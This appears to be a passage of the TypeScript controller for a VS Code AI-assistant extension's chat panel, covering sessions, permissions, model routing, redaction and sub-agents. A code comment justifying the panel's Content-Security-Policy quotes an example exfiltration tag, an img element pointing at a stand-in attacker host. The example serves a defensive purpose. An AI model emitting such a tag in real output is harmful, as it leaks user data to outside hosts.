// The panel's other half: everything the sidebar can do, minus the pixels.
//
// This is where the pieces meet — settings choose the provider, the mode chooses the tools, the
// router decides whether the question is worth escalating, the egress gate decides what may leave,
// the permission book decides what may run, and the session decides what the model is allowed to
// remember. Each of those lives somewhere else and is tested there; this file is the wiring, and
// it is deliberately the only place that knows about all of them.

import * as vscode from "vscode";
import { language, t } from "../shared/i18n.js";
import { runTurn, type Tool } from "../core/agent/loop.js";
import { Permissions, commandPrefix, type PermissionStore, type Rule } from "../core/agent/permissions.js";
import { costOf, makeLookup, type Price } from "../core/router/pricing.js";
import { route } from "../core/router/route.js";
import { Session, type ContextItem, type Entry, type SessionData } from "../core/session/session.js";
import { filterHistory, searchTranscript, upsertSession } from "../core/session/history.js";
import { promptForMode, toolsForMode } from "../core/session/modes.js";
import { detectIbmiLanguage, ibmiPrompt } from "../core/ibmi/languages.js";
import { parsePrompt, participantDirective, type Participant } from "../core/session/mentions.js";
import { resolveMentions } from "./mentions.js";
import { instructionsPrompt } from "./instructions.js";
import { buildDefinitionTools, DefinitionStore, type SubAgentRun } from "./definitions.js";
import { skillsPrompt } from "../core/agent/definitions.js";
import { autoApprove } from "../core/agent/autoApprove.js";
import { matchGlob } from "../core/util/glob.js";
import { discoverLocal, rankModels, suggestPull } from "../core/providers/discover.js";
import { request } from "../core/util/http.js";
import { estimateTokens } from "../core/util/tokens.js";
import { isLocalEndpoint, Vault } from "../core/redaction/index.js";
import type {
  Mode,
  Reasoning,
  Screen,
  ToExtension,
  ToPanel,
  UiEntry,
  UiHistoryFilter,
  UiModel,
  UiPermissionRule,
  UiSetup,
  UiState,
} from "../shared/protocol.js";
import { SECTION, endpointFor, providerFor, readSettings, routerConfig, type Keys, type Settings, writeTarget } from "./config.js";
import { EgressGate, safeHost } from "./egress.js";
import { labelFor, listModels, openFiles, supportsReasoning } from "./models.js";
import { loadPrices } from "./prices.js";
import { buildTools } from "./tools.js";
import { McpManager } from "./integrations/mcp.js";
import { WorkspaceContext, relative } from "./workspace.js";

const HISTORY_KEY = "hiveyCode.sessions";
const PERMISSIONS_KEY = "hiveyCode.permissions";
/** Set once the user has been through the first-run screen, or dismissed it. */
const SETUP_SEEN_KEY = "hiveyCode.setupSeen";

/**
 * The only addresses `openExternal` will open.
 *
 * The panel renders model output, so a message arriving from it is not automatically a message the
 * user meant to send. An allow-list costs one line and removes the whole question.
 */
const ALLOWED_LINKS = [
  "https://openrouter.ai/keys",
  "https://console.anthropic.com/settings/keys",
  "https://ollama.com/download",
];

const PREFS_KEY = "hiveyCode.prefs";
const HISTORY_MAX = 100;

interface Prefs {
  mode: Mode;
  reasoning: Reasoning;
}

class MementoPermissionStore implements PermissionStore {
  constructor(private readonly memento: vscode.Memento) {}
  read(): Rule[] {
    return this.memento.get<Rule[]>(PERMISSIONS_KEY, []);
  }
  write(rules: Rule[]): void {
    void this.memento.update(PERMISSIONS_KEY, rules);
  }
}

export class ChatViewProvider implements vscode.WebviewViewProvider {
  public static readonly viewId = "hiveyCode.chat";

  private view?: vscode.WebviewView;
  private session = new Session();
  private attachments: ContextItem[] = [];
  private turn?: AbortController;
  private screen: Screen = "chat";
  private searchQuery = "";
  private models: UiModel[] = [];
  private modelsLoading = false;
  private historyFilter: UiHistoryFilter = { query: "", period: "all", mode: "all", paidOnly: false, sort: "updated" };
  private readonly approvals = new Map<string, (answer: "once" | "session" | "always" | "no") => void>();
  private readonly priceLookup = makeLookup(loadPrices());
  private readonly permissions: Permissions;

  constructor(
    private readonly ctx: vscode.ExtensionContext,
    private readonly keys: Keys,
    private readonly workspace: WorkspaceContext,
    private readonly gate: EgressGate,
    private readonly log: vscode.OutputChannel,
    private readonly mcp: McpManager,
    private readonly definitions: DefinitionStore,
  ) {
    this.permissions = new Permissions(new MementoPermissionStore(ctx.globalState));
    const prefs = ctx.globalState.get<Prefs>(PREFS_KEY);
    this.session.mode = prefs?.mode ?? "agent";
    this.reasoning = prefs?.reasoning ?? "none";
  }

  /**
   * Knock on the ports local runtimes bind, and report what answered.
   *
   * Loopback only, and nothing but a request for a model list — a probe that reaches something
   * unexpected has disclosed nothing except that a VS Code extension asked.
   */
  private async probeLocal(): Promise<void> {
    this.setup = { ...this.setup, probing: true };
    this.sendState();
    const settings = readSettings();
    // Whatever is already configured is probed too, so a custom address is confirmed rather than
    // ignored — and so someone who is already set up sees their own server in the list.
    const extra = settings.endpoints.local ? [{ name: t("Configured endpoint"), baseUrl: settings.endpoints.local }] : [];
    const found = await discoverLocal({
      extra,
      fetchJson: async (url, timeoutMs) => {
        const res = await request(url, { timeoutMs, label: "discovery" });
        if (!res.ok) throw new Error(String(res.status));
        return res.json();
      },
    });
    this.setup = {
      ...this.setup,
      probing: false,
      runtimes: found.map((r) => ({
        name: r.name,
        baseUrl: r.baseUrl,
        models: rankModels(r.models),
        ...(r.models.length ? {} : { suggestion: suggestPull(r.name) }),
      })),
    };
    await this.refreshSetup();
  }

  /** Re-read what is configured and which keys exist, without touching the probe results. */
  private async refreshSetup(): Promise<void> {
    const settings = readSettings();
    const providers = ["openrouter", "anthropic", "openai-compatible"] as const;
    const hasKey: Record<string, boolean> = {};
    for (const p of providers) hasKey[p] = Boolean(await this.keys.get(p));
    this.setup = {
      ...this.setup,
      hasKey,
      endpoints: { ...settings.endpoints },
      configured: {
        provider: settings.chat.provider,
        model: settings.chat.model,
        baseUrl: settings.endpoints[settings.chat.provider] ?? "",
      },
    };
    this.sendState();
  }

  private reasoning: Reasoning = "none";

  /** What the first-run screen knows. Rebuilt by a probe, never persisted — it goes stale. */
  private setup: UiSetup = { probing: false, runtimes: [], hasKey: {}, endpoints: {} };

  resolveWebviewView(view: vscode.WebviewView): void {
    this.view = view;
    view.webview.options = {
      enableScripts: true,
      localResourceRoots: [vscode.Uri.joinPath(this.ctx.extensionUri, "media")],
    };
    view.webview.html = this.html(view.webview);
    view.webview.onDidReceiveMessage((m: ToExtension) => void this.onMessage(m));
    // The list of open editors is part of the UI, so it has to follow the editor.
    const refresh = () => this.screen === "chat" && this.sendState();
    this.ctx.subscriptions.push(
      vscode.window.onDidChangeActiveTextEditor(refresh),
      vscode.workspace.onDidOpenTextDocument(refresh),
      vscode.workspace.onDidCloseTextDocument(refresh),
    );
  }

  // ── UI plumbing ────────────────────────────────────────────────────────────────────────────

  private post(message: ToPanel): void {
    void this.view?.webview.postMessage(message);
  }

  private html(webview: vscode.Webview): string {
    const nonce = randomNonce();
    const uri = (f: string) => webview.asWebviewUri(vscode.Uri.joinPath(this.ctx.extensionUri, "media", f));
    // No remote origin is allowed: the panel loads its own script and its own stylesheet, and a
    // model that emits an <img src="http://attacker/?data"> cannot phone home from here.
    const csp = [
      `default-src 'none'`,
      `img-src ${webview.cspSource} data:`,
      `style-src ${webview.cspSource}`,
      `font-src ${webview.cspSource}`,
      `script-src 'nonce-${nonce}'`,
    ].join("; ");
    return `<!DOCTYPE html>
<html lang="${language()}">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="${uri("style.css")}">
<title>Hivey Code</title>
</head>
<!-- The floor below which the panel scrolls sideways instead of rearranging itself. Dragging the
     side bar narrow otherwise reflows every toolbar, and a layout that moves while you resize is a
     layout nobody trusts. Set through a style attribute rather than the stylesheet because the
     value is a setting, and the stylesheet is static. -->
<body style="min-width:${Math.max(0, Math.round(readSettings().panel.minWidth))}px">
<div id="app"></div>
<script nonce="${nonce}" src="${uri("webview.js")}"></script>
</body>
</html>`;
  }

  private uiEntry(e: Entry): UiEntry {
    return {
      id: e.id,
      role: e.role,
      text: e.text,
      at: e.at,
      included: e.included,
      pinned: e.pinned,
      error: e.error,
      model: e.model,
      usdCost: e.usdCost,
      reasoning: e.reasoning,
      steps: e.steps,
      context: e.context?.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
    };
  }

  private sendState(): void {
    const s = readSettings();
    const baseUrl = safeUrl(s, s.chat.provider);
    const stored = this.history();

    const state: UiState = {
      screen: this.screen,
      session: {
        id: this.session.id,
        title: this.session.title,
        mode: this.session.mode,
        entries: this.session.entries.map((e) => this.uiEntry(e)),
      },
      mode: this.session.mode,
      reasoning: this.reasoning,
      reasoningAvailable: supportsReasoning(s.chat.model),
      model: s.chat.model,
      modelLabel: this.models.length ? labelFor(this.models, s.chat.model) : s.chat.model,
      provider: s.chat.provider,
      remote: !isLocalEndpoint(baseUrl),
      contextTokens: this.session.entries
        .filter((e) => e.included)
        .reduce((sum, e) => sum + estimateTokens(e.text) + (e.context ?? []).reduce((a, c) => a + estimateTokens(c.body), 0), 0),
      budget: { spentTodayUsd: this.gate.budget.spentToday(), dailyUsd: s.budget.dailyUsd },
      attachments: this.attachments.map((c) => ({ kind: c.kind, label: c.label, tokens: estimateTokens(c.body) })),
      openFiles: openFiles(),
      history: filterHistory(stored, this.historyFilter),
      historyFilter: this.historyFilter,
      models: this.models,
      modelsLoading: this.modelsLoading,
      permissions: this.uiPermissions(),
      matches: searchTranscript(this.session.toJSON(), this.searchQuery).map((m) => m.entryId),
      searchQuery: this.searchQuery,
      setup: this.setup,
      policy: {
        scope: readSettings().permissions.autoApprove,
        allowedPaths: readSettings().permissions.allowedPaths,
        allowedCommands: readSettings().permissions.allowedCommands,
        deniedPaths: readSettings().permissions.deniedPaths,
        deniedCommands: readSettings().permissions.deniedCommands,
      },
    };
    this.post({ type: "state", state });
  }

  private uiPermissions(): UiPermissionRule[] {
    // Session grants never reach the store, but the type allows them; filter rather than cast.
    const stored: UiPermissionRule[] = this.permissions
      .rules()
      .filter((r): r is Rule & { level: "always" | "never" } => r.level !== "session")
      .map((r) => ({ tool: r.tool, ...(r.prefix ? { prefix: r.prefix } : {}), level: r.level }));
    const session: UiPermissionRule[] = this.permissions.sessionRules().map((key) => {
      const [tool, prefix] = key.split(":");
      return { tool: tool ?? key, ...(prefix ? { prefix } : {}), level: "always" as const, session: true };
    });
    return [...stored, ...session];
  }

  // ── Sessions ───────────────────────────────────────────────────────────────────────────────

  private history(): SessionData[] {
    return this.ctx.workspaceState.get<SessionData[]>(HISTORY_KEY, []);
  }

  private persist(): void {
    // No early return on an empty session: emptying a conversation has to REMOVE it, not skip the
    // write and leave the previous version — with the messages the user just deleted — in storage.
    const all = upsertSession(this.history(), this.session.toJSON(), HISTORY_MAX);
    void this.ctx.workspaceState.update(HISTORY_KEY, all);
  }

  private savePrefs(): void {
    void this.ctx.globalState.update(PREFS_KEY, { mode: this.session.mode, reasoning: this.reasoning } satisfies Prefs);
  }

  /** Rebuild the panel after a change it cannot re-render on its own, such as the language. */
  reload(): void {
    if (!this.view) return;
    this.view.webview.html = this.html(this.view.webview);
  }

  /** Open the panel on a given screen — used by the palette commands and by the tests. */
  async show(screen: Screen): Promise<void> {
    await vscode.commands.executeCommand("hiveyCode.chat.focus");
    this.screen = screen;
    this.sendState();
    if (screen === "models" && !this.models.length) void this.loadModels();
  }

  newSession(): void {
    this.persist();
    const mode = this.session.mode;
    this.session = new Session();
    this.session.mode = mode;
    this.attachments = [];
    this.screen = "chat";
    this.searchQuery = "";
    // A new conversation starts cautious again: session-wide permissions do not carry over.
    this.permissions.clearSession();
    this.sendState();
  }

  async focusWithPrompt(text: string, context?: ContextItem): Promise<void> {
    await vscode.commands.executeCommand("hiveyCode.chat.focus");
    this.screen = "chat";
    if (context) this.attachments.push(context);
    this.sendState();
    await this.ask(text);
  }

  // ── Messages from the panel ────────────────────────────────────────────────────────────────

  private async onMessage(m: ToExtension): Promise<void> {
    try {
      switch (m.type) {
        case "ready":
          this.sendState();
          void this.loadModels();
          // First run: open on the setup screen rather than on a chat that cannot answer. The
          // probe starts immediately, because the useful version of this screen is the one that
          // already knows what is running by the time it is read.
          if (!this.ctx.globalState.get<boolean>(SETUP_SEEN_KEY)) {
            this.screen = "setup";
            await this.refreshSetup();
            void this.probeLocal();
          }
          break;
        case "send":
          await this.ask(m.text);
          break;
        case "stop":
          this.turn?.abort();
          break;
        case "renameSession":
          // An empty name hands the title back to the assistant's guess rather than leaving the
          // conversation nameless, which is what someone clearing the field is asking for.
          this.session.title = m.title;
          this.persist();
          this.sendState();
          break;

        case "newSession":
          this.newSession();
          break;
        case "openScreen":
          this.screen = m.screen;
          this.sendState();
          if (m.screen === "models" && !this.models.length) void this.loadModels();
          break;
        case "openSession": {
          this.persist();
          const found = this.history().find((s) => s.id === m.id);
          if (found) this.session = new Session(found);
          this.screen = "chat";
          this.searchQuery = "";
          this.sendState();
          break;
        }
        case "deleteSession": {
          const rest = this.history().filter((s) => s.id !== m.id);
          await this.ctx.workspaceState.update(HISTORY_KEY, rest);
          if (this.session.id === m.id) this.session = new Session();
          this.sendState();
          break;
        }
        case "setMode":
          this.session.mode = m.mode;
          this.savePrefs();
          this.sendState();
          break;
        case "setReasoning":
          this.reasoning = m.reasoning;
          this.savePrefs();
          this.sendState();
          break;
        case "setModel": {
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("chat.model", m.model, writeTarget());
          if (m.provider && m.provider !== readSettings().chat.provider) {
            await config.update("chat.provider", m.provider, writeTarget());
          }
          this.models = this.models.map((x) => ({ ...x, current: x.id === m.model }));
          this.screen = "chat";
          this.sendState();
          break;
        }
        case "refreshModels":
          await this.loadModels(true);
          break;
        case "setHistoryFilter":
          this.historyFilter = { ...this.historyFilter, ...m.filter };
          this.sendState();
          break;
        case "search":
          this.searchQuery = m.query;
          this.sendState();
          break;
        case "setIncluded":
          this.session.setIncluded(m.id, m.included);
          this.persist();
          this.sendState();
          break;
        case "setPinned":
          this.session.setPinned(m.id, m.pinned);
          this.persist();
          this.sendState();
          break;
        case "dropEntry":
          this.session.drop(m.id);
          this.persist();
          this.sendState();
          break;
        case "editEntry":
          this.session.editUserEntry(m.id, m.text);
          this.sendState();
          await this.runTurn();
          break;
        case "retry":
          this.session.dropLastAnswer();
          this.sendState();
          await this.runTurn();
          break;
        case "attach":
          await this.attach(m.what);
          break;
        case "attachPath": {
          const folder = vscode.workspace.workspaceFolders?.[0];
          if (folder) {
            const item = await this.workspace.fileContext(vscode.Uri.joinPath(folder.uri, m.path), readSettings());
            if (item) this.attachments.push(item);
          }
          this.sendState();
          break;
        }
        case "removeAttachment":
          this.attachments = this.attachments.filter((a) => a.label !== m.label);
          this.sendState();
          break;
        case "setPermission":
          this.permissions.remember(
            m.tool,
            m.prefix ? { command: m.prefix } : {},
            m.level,
            !m.prefix,
          );
          this.sendState();
          break;
        case "forgetPermission":
          this.permissions.forget(m.tool, m.prefix);
          this.sendState();
          break;
        case "setApprovalScope": {
          const config = vscode.workspace.getConfiguration(SECTION);
          // Turning approvals off entirely is worth one confirmation. Not a moral objection — it is
          // a legitimate choice on a scratch repository — but it is the one setting whose cost is
          // not visible from its label until something has already happened.
          if (m.scope === "all") {
            const proceed = t("Switch approvals off");
            const answer = await vscode.window.showWarningMessage(
              t("Let the agent write anywhere and run anything, without asking?"),
              {
                modal: true,
                detail: t(
                  "Files excluded by the privacy policy stay excluded, and what leaves the machine is still governed separately. Everything else runs unattended.",
                ),
              },
              proceed,
            );
            if (answer !== proceed) break;
          }
          await config.update("permissions.autoApprove", m.scope, writeTarget());
          this.sendState();
          break;
        }

        case "clearSessionPermissions":
          this.permissions.clearSession();
          this.sendState();
          break;
        case "openEgress":
          await vscode.commands.executeCommand("hiveyCode.showEgress");
          break;
        case "openCosts":
          await vscode.commands.executeCommand("hiveyCode.showCosts");
          break;
        case "probeLocal":
          await this.probeLocal();
          break;

        case "saveKey": {
          const provider = m.provider as Parameters<Keys["store"]>[0];
          await this.keys.store(provider, m.key);
          // Storing a key is only half the intent: someone who pastes an OpenRouter key wants to
          // use OpenRouter, and leaving the provider on `local` would make the key look ignored.
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("chat.provider", provider, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          void this.loadModels(true);
          break;
        }

        case "clearKey": {
          await this.keys.delete(m.provider as Parameters<Keys["delete"]>[0]);
          await this.refreshSetup();
          break;
        }

        case "setEndpoint": {
          const config = vscode.workspace.getConfiguration(SECTION);
          // The manifest spells this one differently from the provider id, because `openai-compatible`
          // is not a legal settings key segment.
          const key = m.provider === "openai-compatible" ? "endpoints.openaiCompatible" : `endpoints.${m.provider}`;
          await config.update(key, m.url, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          break;
        }

        case "useLocal": {
          const config = vscode.workspace.getConfiguration(SECTION);
          await config.update("endpoints.local", m.baseUrl, vscode.ConfigurationTarget.Global);
          await config.update("chat.provider", "local", vscode.ConfigurationTarget.Global);
          await config.update("chat.model", m.model, vscode.ConfigurationTarget.Global);
          // Completion runs on the same machine by default: a user who has just chosen a local
          // model has not also chosen to leave completion pointing somewhere else.
          await config.update("completion.provider", "local", vscode.ConfigurationTarget.Global);
          await config.update("completion.model", m.model, vscode.ConfigurationTarget.Global);
          await this.refreshSetup();
          break;
        }

        case "finishSetup":
          await this.ctx.globalState.update(SETUP_SEEN_KEY, true);
          this.screen = "chat";
          this.sendState();
          break;

        case "openExternal":
          // Only the addresses this extension itself offers. A URL arriving from the panel is
          // still a URL the panel could have been made to send.
          if (ALLOWED_LINKS.includes(m.url)) await vscode.env.openExternal(vscode.Uri.parse(m.url));
          break;

        case "openSettings":
          await vscode.commands.executeCommand("workbench.action.openSettings", SECTION);
          break;
        case "approve": {
          const resolve = this.approvals.get(m.id);
          this.approvals.delete(m.id);
          resolve?.(m.answer);
          break;
        }
        case "insertCode": {
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage(t("No active editor to insert this code into."));
            break;
          }
          await ed.edit((b) => b.replace(ed.selection, m.code));
          break;
        }
        case "applyCode": {
          // t("Apply") opens the block as a diff against the active file, so the user reviews it
          // in the editor's own diff view rather than trusting a button.
          const ed = vscode.window.activeTextEditor;
          if (!ed) {
            void vscode.window.showWarningMessage(t("Open the target file before applying."));
            break;
          }
          const preview = ed.document.uri.with({ scheme: "hivey-code-preview", query: String(Date.now()) });
          previewContents.set(preview.toString(), m.code);
          await vscode.commands.executeCommand("vscode.diff", ed.document.uri, preview, t("{0} ↔ proposal", relative(ed.document.uri)));
          break;
        }
        case "copy":
          await vscode.env.clipboard.writeText(m.text);
          break;
      }
    } catch (err) {
      this.post({ type: "error", message: (err as Error).message });
      this.log.appendLine(`[chat] ${(err as Error).stack ?? (err as Error).message}`);
    }
  }

  private async attach(what: "active" | "selection" | "browse" | "openFiles" | "mention"): Promise<void> {
    const settings = readSettings();
    switch (what) {
      case "active":
      case "selection": {
        const item = this.workspace.activeContext();
        if (item) this.attachments.push(item);
        break;
      }
      case "browse": {
        const picked = await vscode.window.showOpenDialog({ canSelectMany: true, openLabel: "Joindre" });
        for (const uri of picked ?? []) {
          const item = await this.workspace.fileContext(uri, settings);
          if (item) this.attachments.push(item);
        }
        break;
      }
      case "openFiles": {
        for (const f of openFiles()) {
          const folder = vscode.workspace.workspaceFolders?.[0];
          if (!folder) break;
          const item = await this.workspace.fileContext(vscode.Uri.joinPath(folder.uri, f.path), settings);
          if (item && !this.attachments.some((a) => a.label === item.label)) this.attachments.push(item);
        }
        break;
      }
      case "mention": {
        const files = await this.workspace.findFiles("", 100);
        const picked = await vscode.window.showQuickPick(files, { placeHolder: t("Which file to attach?") });
        if (picked) await this.onMessage({ type: "attachPath", path: picked });
        return;
      }
    }
    this.sendState();
  }

  private async loadModels(force = false): Promise<void> {
    if (this.modelsLoading) return;
    this.modelsLoading = true;
    this.sendState();
    try {
      const settings = readSettings();
      this.models = await listModels(settings, this.keys, settings.chat.model);
    } catch (err) {
      this.log.appendLine(`[models] ${(err as Error).message}`);
    } finally {
      this.modelsLoading = false;
      this.sendState();
    }
    if (force) this.post({ type: "status", text: t("{0} models", this.models.length) });
  }

  /**
   * Write the conversation out as Markdown.
   *
   * Exported from the transcript rather than from the prompt, and the difference is the point: what
   * is saved is what the user read, including the exchanges they muted — which the model never
   * saw. A file that silently dropped them would be a record of a conversation nobody had.
   */
  /**
   * Run a sub-agent the repository defines.
   *
   * A nested turn with a narrower tool set and its own prompt — and with the SAME approver, the
   * same egress gate and the same vault as its parent. Being called by a sub-agent is not a way
   * around a dialog: a tool that asks before writing still asks, and what leaves the machine is
   * pseudonymised on exactly the same path.
   *
   * The sub-agent sees only the task it was given. That is the point of one: it starts on a clean
   * context, so a long conversation does not have to be re-read to answer a small question.
   */
  private async runSubAgent(
    run: SubAgentRun,
    env: {
      settings: Settings;
      providerId: Parameters<typeof providerFor>[2];
      model: string;
      baseUrl: string;
      isLocal: boolean;
      vault: Vault;
      allTools: Tool[];
      mode: Mode;
    },
  ): Promise<string> {
    const { definition } = run;
    const model = definition.model || env.model;
    const provider = await providerFor(env.settings, this.keys, env.providerId);
    const allowed = new Set(definition.tools);
    const tools = toolsForMode(env.allTools, env.mode).filter((tool) => allowed.has(tool.schema.name));

    const messages = [
      { role: "system" as const, content: definition.body, cacheable: true },
      { role: "user" as const, content: run.task },
    ];
    const prepared = env.isLocal
      ? { messages }
      : await this.gate.prepare(
          messages,
          env.settings,
          { provider: env.providerId, model, baseUrl: env.baseUrl, isLocal: env.isLocal },
          env.vault,
        );
    if (!prepared) return t("Refused: the sub-agent's request was not sent.");

    const result = await runTurn({
      provider,
      model,
      messages: prepared.messages,
      tools,
      maxSteps: definition.maxSteps ?? 8,
      ...(run.signal ? { signal: run.signal } : {}),
      approve: (req) => this.askApproval(req),
      beforeRequest: async (msgs) => {
        if (env.isLocal) return msgs;
        const again = await this.gate.prepare(
          msgs,
          env.settings,
          { provider: env.providerId, model, baseUrl: env.baseUrl, isLocal: env.isLocal },
          env.vault,
        );
        if (!again) throw new Error(t("Request refused: the rest of the turn was not sent."));
        return again.messages;
      },
      afterResponse: (text) => env.vault.restore(text),
      report: (message) => run.report(`${definition.name}: ${message}`),
    });
    return result.text;
  }

  /**
   * Tell the user about a definition file that could not be read.
   *
   * Skipping it silently is the worst outcome: the assistant ignores instructions it never
   * received, and nobody can find out why.
   */
  private reportDefinitionProblems(problems: string[]): void {
    const first = problems[0]!;
    const more = problems.length > 1 ? t(" (and {0} more)", problems.length - 1) : "";
    const open = t("Open the file");
    void vscode.window.showWarningMessage(`${first}${more}`, open).then((choice) => {
      if (choice !== open) return;
      const folder = vscode.workspace.workspaceFolders?.[0];
      const path = first.split(":")[0];
      if (folder && path) {
        void vscode.window.showTextDocument(vscode.Uri.joinPath(folder.uri, path));
      }
    });
  }

  /** Reopens the first-run screen and re-probes, from the command palette. */
  openSetup(): void {
    this.screen = "setup";
    this.sendState();
    void this.probeLocal();
  }

  /** Opens the in-conversation search, from the title bar or a keybinding. */
  openSearch(): void {
    this.screen = "chat";
    this.sendState();
    this.post({ type: "openSearch" });
  }

  /** Opens the model picker inside the panel, from a command or a keybinding. */
  openModelPicker(): void {
    this.screen = "chat";
    this.sendState();
    this.post({ type: "openModelPicker" });
  }

  async exportSession(): Promise<void> {
    const lines: string[] = [`# ${this.session.title || t("Conversation")}`, ""];
    for (const entry of this.session.entries) {
      lines.push(`## ${entry.role === "user" ? t("You") : "Hivey Code"}${entry.included ? "" : ` — ${t("out of context")}`}`);
      if (entry.role === "assistant" && entry.model) lines.push(`*${entry.model}*`, "");
      lines.push(entry.text.trim(), "");
      for (const step of entry.steps ?? []) lines.push(`- \`${step.tool}\` — ${step.summary}`);
      if (entry.steps?.length) lines.push("");
    }
    const doc = await vscode.workspace.openTextDocument({ language: "markdown", content: lines.join("\n") });
    await vscode.window.showTextDocument(doc);
  }

  private async ask(text: string): Promise<void> {
    if (!text.trim()) return;
    this.screen = "chat";

    // `#context` and `@participant` are resolved here, on this machine, before anything is built
    // and long before anything is sent. The mentions stay in the text the user sees — removing
    // them would make the transcript read as though they had never asked.
    const parsed = parsePrompt(text);
    this.participant = parsed.participant;
    const settings = readSettings();
    const resolved = parsed.mentions.length
      ? await resolveMentions(parsed.mentions, {
          workspace: this.workspace,
          settings,
          repoMap: () => this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4)),
        })
      : [];
    const context = [...this.attachments, ...resolved];

    this.session.add({ role: "user", text, context: context.length ? context : undefined });
    this.attachments = [];
    this.sendState();
    await this.runTurn();
  }

  /** The participant of the turn being asked, if the user named one. Reset by the next question. */
  private participant: Participant | undefined;

  // ── The turn ───────────────────────────────────────────────────────────────────────────────

  private async runTurn(): Promise<void> {
    const settings = readSettings();
    const mode = this.session.mode;
    this.turn?.abort();
    const ctl = new AbortController();
    this.turn = ctl;
    this.post({ type: "turnStart" });

    const nonce = randomNonce();
    // Chat mode answers from what it was given: no repository map, no tools, no surprises.
    // The repository's own rules, if it has any. They sit in the cacheable prefix, which is where
    // text that is identical on every turn belongs.
    const houseRules = await instructionsPrompt();
    const ambient =
      mode !== "chat" && settings.context.repoMap
        ? await this.workspace.repoMap(Math.floor(settings.context.maxTokens * 0.4))
        : undefined;
    const allTools: Tool[] = buildTools({
      settings: () => settings,
      confirmEdit: (u, n) => this.confirmEdit(u, n),
      arcad: { credentials: () => this.keys.arcad() },
      mcp: this.mcp,
    });
    const tools = toolsForMode(allTools, mode);

    // What the repository defines. Read fresh: a skill you have to reload the window to try is a
    // skill nobody iterates on.
    const definitions = await this.definitions.load();
    if (definitions.problems.length) this.reportDefinitionProblems(definitions.problems);
    // Not in chat mode. A skill is instructions the user wrote, but it is still a file read from
    // the repository, and chat mode's promise is that it does not read the repository. A promise
    // with an exception in it is not one.
    if (mode !== "chat") {
      tools.push(
        ...buildDefinitionTools(
          {
            store: this.definitions,
            availableTools: () => tools.map((tool) => tool.schema.name),
            runSubAgent: (run) =>
              this.runSubAgent(run, { settings, providerId, model, baseUrl, isLocal, vault, allTools, mode }),
          },
          definitions,
        ),
      );
    }

    const built = this.session.build({
      systemPrompt:
        promptForMode(mode) +
        workspaceNote() +
        dialectNote() +
        houseRules +
        (mode === "chat" ? "" : skillsPrompt(definitions.skills)) +
        (this.participant ? `\n\n${participantDirective(this.participant)}` : ""),
      ambient: ambient ? `${ambient.text}\n\n(${ambient.files} files mapped, ${ambient.omitted} omitted)` : undefined,
      maxTokens: settings.context.maxTokens,
      nonce,
    });

    const lastUser = [...this.session.entries].reverse().find((e) => e.role === "user");
    const decision = route(routerConfig(settings), {
      kind: mode === "chat" ? "chat" : "agent",
      prompt: lastUser?.text ?? "",
      promptTokens: built.estimatedTokens,
    });
    let providerId = decision.provider;
    let model = decision.model;
    if (decision.suggestEscalation) {
      const choice = await vscode.window.showInformationMessage(
        t(
          "This question is beyond the local model ({0}). Send it to {1}?",
          decision.suggestEscalation.why,
          decision.suggestEscalation.model,
        ),
        t("Send"),
        t("Stay local"),
      );
      if (choice === t("Send")) {
        providerId = decision.suggestEscalation.provider;
        model = decision.suggestEscalation.model;
      }
    }

    const baseUrl = safeUrl(settings, providerId);
    const isLocal = isLocalEndpoint(baseUrl);
    const vault = new Vault();
    const steps: Array<{ tool: string; summary: string; ok: boolean }> = [];

    try {
      const provider = await providerFor(settings, this.keys, providerId);

      const prepared = await this.gate.prepare(built.messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
      if (!prepared) {
        this.post({ type: "status", text: t("Request cancelled.") });
        this.post({ type: "turnEnd" });
        return;
      }

      if (!isLocal) {
        const estimate = estimateCost(prepared.estimatedTokens, this.priceLookup(model));
        const verdict = this.gate.budget.check(estimate);
        if (!verdict.ok) {
          this.post({
            type: "error",
            message: t("Budget: {0}. Adjust hiveyCode.budget or stay local.", verdict.message),
          });
          this.post({ type: "turnEnd" });
          return;
        }
      }

      const answer = this.session.add({ role: "assistant", text: "", model });
      let streamed = "";
      let thought = "";

      const result = await runTurn({
        provider,
        model,
        messages: prepared.messages,
        tools,
        signal: ctl.signal,
        maxTokens: 4096,
        reasoning: this.reasoning,
        onDelta: (d) => {
          if (d.text) {
            streamed += d.text;
            // Placeholders are resolved as they stream, so the user never reads their own data
            // through a marker.
            this.post({ type: "delta", text: vault.restore(d.text) });
          }
          if (d.reasoning) {
            thought += d.reasoning;
            this.post({ type: "reasoning", text: vault.restore(d.reasoning) });
          }
        },
        onToolResult: ({ call, result }) => {
          const summary = String(result.content).split("\n")[0]?.slice(0, 120) ?? "";
          steps.push({ tool: call.name, summary, ok: !result.isError });
          this.post({ type: "status", text: summary, tool: call.name, ok: !result.isError });
        },
        report: (msg) => this.post({ type: "status", text: msg }),
        approve: (req) => this.askApproval(req),
        // Redaction runs on EVERY step, because a tool result is new text that never went through
        // the gate — a file the agent just read can contain the credential the first prompt did not.
        //
        // A refusal here must ABORT the turn. Falling back to the original messages would send the
        // unredacted text precisely when the user said no.
        beforeRequest: async (messages) => {
          if (isLocal) return messages;
          const again = await this.gate.prepare(messages, settings, { provider: providerId, model, baseUrl, isLocal }, vault);
          if (!again) throw new Error(t("Request refused: the rest of the turn was not sent."));
          return again.messages;
        },
        afterResponse: (t) => vault.restore(t),
      });

      answer.text = result.text || streamed;
      answer.usdCost = 0;
      if (thought) answer.reasoning = thought;
      if (steps.length) answer.steps = steps;

      if (!isLocal) {
        const cost = costOf(result.usage, this.priceLookup(model));
        answer.usdCost = cost.usd;
        this.gate.record(
          {
            at: Date.now(),
            provider: providerId,
            host: safeHost(baseUrl),
            model,
            promptTokens: result.usage.promptTokens,
            completionTokens: result.usage.completionTokens,
            cachedTokens: result.usage.cachedTokens,
            usd: cost.usd,
            redactions: prepared.findings.length,
            redactionSummary: vault.summary().map((x) => `${x.label}×${x.count}`).join(", "),
          },
          settings,
        );
      }

      if (result.stoppedBecause === "max-steps") {
        this.post({ type: "status", text: t("Stopped after the maximum number of steps.") });
      }
      this.persist();
    } catch (err) {
